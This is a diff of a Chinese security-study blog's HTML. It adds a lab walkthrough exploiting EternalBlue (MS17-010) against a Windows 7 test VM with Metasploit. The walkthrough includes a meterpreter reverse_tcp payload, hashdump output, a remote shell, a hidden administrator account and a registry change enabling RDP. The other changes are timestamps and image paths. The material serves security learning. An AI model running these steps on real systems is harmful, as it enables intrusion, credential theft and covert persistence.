@@ -183,9 +183,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-07-19 21:17:43 / Modified: 21:35:45" itemprop="dateCreated datePublished" datetime="2022-07-19T21:17:43+08:00">2022-07-19</time>
+      <time title="Created: 2022-07-19 21:17:43" itemprop="dateCreated datePublished" datetime="2022-07-19T21:17:43+08:00">2022-07-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-07-21 19:47:55" itemprop="dateModified" datetime="2022-07-21T19:47:55+08:00">2022-07-21</time>
     </span>
 
   
@@ -284,6 +290,58 @@
 <p><strong>不过需要重启才能生效。重启后本地IP地址、网关也要重新设置。</strong></p>
 <h5 id="二-使用软件进行防护"><a href="#二-使用软件进行防护" class="headerlink" title="二.使用软件进行防护"></a>二.使用软件进行防护</h5><p><strong>国产软件360安全卫士里面有个实用的功能大全，里面的360流量防火墙可以对您局域网内的设备进行防护，刚入门的小白还是建议使用软件辅助学习会更加事半功倍。</strong></p>
 <p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/16.png" alt="16"></p>
+<h3 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a>永恒之蓝攻击</h3><p>本次实验有两台设备，Kali Linux(攻击机) ip:192.168.110.132、Windows 7(靶机) ip:192.168.110.133</p>
+<p>注意：实验前确认靶机的防火墙已经被关闭</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 收集目标系统信息</span></span><br><span class="line">nmap -T4 -A 192.168.110.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720013732287.png" alt="image-20220720013732287"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启msf对靶机进行渗透</span></span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720013841932.png" alt="image-20220720013841932"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720014154283.png" alt="image-20220720014154283"></p>
+<p>首先我们先检查靶机是否能被永恒之蓝所攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010  <span class="comment">#使用模块</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.110.133              <span class="comment">#设置目标</span></span><br><span class="line">show options                            <span class="comment">#查看所需参数是否齐全</span></span><br><span class="line">exploit                                 <span class="comment">#执行攻击，和run一样</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720014955490.png" alt="image-20220720014955490"></p>
+<p>检测出可以被永恒之蓝攻击,我们调用第一个模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换exploit/windows/smb/ms17_010_eternalblue模块</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 切换模块之后，下方有提示说要设置windows/x64/meterpreter/reverse_tcp的载荷</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入入远程打印机服务进程(这一步要不要都没关系)</span></span><br><span class="line"><span class="built_in">set</span> processinject spoolsv.exe</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.110.133              <span class="comment">#设置目标</span></span><br><span class="line">show options                            <span class="comment">#查看所需参数是否齐全</span></span><br><span class="line">exploit                                 <span class="comment">#执行攻击，和run一样</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720020217575.png" alt="image-20220720020217575"></p>
+<p>win已经成功注入和利用永恒之蓝，接下来我们查看目标ip和其他信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720020403916.png" alt="image-20220720020403916"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720020446575.png" alt="image-20220720020446575"></p>
+<p>找到密码hash，用MD5解密</p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720020537658.png" alt="image-20220720020537658"></p>
+<p>管理员的密码到手^_^</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo   <span class="comment">#查看系统信息</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720020857128.png" alt="image-20220720020857128"></p>
+<p>也可以用shell直接操控远程cmd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720020649396.png" alt="image-20220720020649396"></p>
+<p>进入shell可以给自己创建私人用户，并且授予权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user julintongxue$ 123456 /add    <span class="comment">#创建一个隐藏用户</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720021820959.png" alt="image-20220720021820959"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators julintongxue$ /add    <span class="comment">#授予管理员权限</span></span><br><span class="line"><span class="comment"># 输入exit回到控制台，然后hashdump看一下权限</span></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">julintongxue$:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line"><span class="comment"># 我的权限和管理员的权限一模一样</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720022302734.png" alt="image-20220720022302734"></p>
+<p>回到kalilinux主机里面，使用rdesktop远程登陆靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.110.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720022426306.png" alt="image-20220720022426306"></p>
+<p><img src="/2022/07/19/%E6%B8%97%E9%80%8F-and-web/image-20220720022438311.png" alt="image-20220720022438311"></p>
+<p>如果rdesktop登不进去的话，你得看看你在信息收集的时候，看看靶机的3389端口是否开启！！！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（输入命令为修改系统注册表，开启 3389 端口）</span><br><span class="line">C:\Windows\system32&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>再狗一点，我们把隐藏账号做成影子账号</p>
 <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="一-DVWA"><a href="#一-DVWA" class="headerlink" title="一.DVWA"></a>一.DVWA</h3><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><h5 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h5><h5 id="下载DVWA源码"><a href="#下载DVWA源码" class="headerlink" title="下载DVWA源码"></a>下载DVWA源码</h5><h5 id="安装需要的依赖库"><a href="#安装需要的依赖库" class="headerlink" title="安装需要的依赖库"></a>安装需要的依赖库</h5><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>1.这里把<code>DVWA</code>源码解压到<code>phpstudy</code>的<code>WWW</code>目录中，然后修改DVWA的配置文件目录config里面的<code>config.inc.php.dist</code>,将其重命名为<code>config.inc.php</code>。</p>
 <p>2.编辑<code>config.inc.php</code>文件 </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># phpstudy的默认用户和密码都是root，所以只需要修改这个即可。</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;root&#x27;</span>;       </span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>
@@ -1558,7 +1616,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-07-19 21:47:37" itemprop="dateModified" datetime="2022-07-19T21:47:37+08:00">2022-07-19</time>
+      <time title="Modified: 2022-07-21 19:49:51" itemprop="dateModified" datetime="2022-07-21T19:49:51+08:00">2022-07-21</time>
     </span>
 
   
@@ -1573,12 +1631,12 @@
     <div class="post-body" itemprop="articleBody">
           <h1 id="HCIA"><a href="#HCIA" class="headerlink" title="HCIA"></a>HCIA</h1><p>[toc]</p>
 <h2 id="回环网卡设置过程"><a href="#回环网卡设置过程" class="headerlink" title="回环网卡设置过程"></a>回环网卡设置过程</h2><h3 id="一-安装过程"><a href="#一-安装过程" class="headerlink" title="一.安装过程"></a>一.安装过程</h3><p><strong>1.找到”开始”选项，鼠标右击找到”设备管理器”,然后随便在空白处单击鼠标一下。</strong></p>
-<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(C:/Users/27933/Desktop/回环网卡设置过程.assets/屏幕截图(4).png)"></p>
+<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(HCIA/屏幕截图(4).png)"></p>
 <p><strong>2.鼠标单击菜单栏选项的”操作”选项，然后单击”添加过时硬件”，然后在”弹窗”选项单击”下一步”;在”你想向导做什么”选项里面选择”安装我手动从列表选择的硬件(高级)”，然后单击”下一步”;在”常见硬件类型”选择中选择”网络适配器”,然后单击”下一步”;然后在”厂商”选项中选择”Microsoft”,然后在”型号”选项中选择”Microsoft KM-TEST 环回适配器”，然后单击”下一步“，然后在单击一次”下一步”，系统就会按照选项按照网卡，等待”完成”选项出来后，单击”完成”选项即可完成配置。</strong></p>
-<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(C:/Users/27933/Desktop/回环网卡设置过程.assets/屏幕截图(5).png)"></p>
-<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(C:/Users/27933/Desktop/回环网卡设置过程.assets/屏幕截图(6).png)"></p>
-<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(C:/Users/27933/Desktop/回环网卡设置过程.assets/屏幕截图(7).png)"></p>
-<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(C:/Users/27933/Desktop/回环网卡设置过程.assets/屏幕截图(10).png)"></p>
+<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(HCIA/屏幕截图(5).png)"></p>
+<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(HCIA/屏幕截图(6).png)"></p>
+<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(HCIA/屏幕截图(7).png)"></p>
+<p><img src="/2022/07/17/HCIA/" alt="屏幕截图(HCIA/屏幕截图(10).png)"></p>
 <h3 id="二-检查过程"><a href="#二-检查过程" class="headerlink" title="二.检查过程"></a>二.检查过程</h3><p><strong>1.然后可以在”更改适配器选项中”找到”以太网”这张回环网卡</strong></p>
 <p><strong><img src="/2022/07/17/HCIA/image-20220118203530057-1658238267502.png" alt="image-20220118203530057"></strong></p>
 <p><strong>1.当然你也可以给这张网卡”重命名”,比如左上角那张”loop”网卡就是我上一次实验的回环网卡，接下来我会用”loop”网卡做实验（顺带说一句，回环网卡安装好后是必须要重启才能生效）</strong></p>
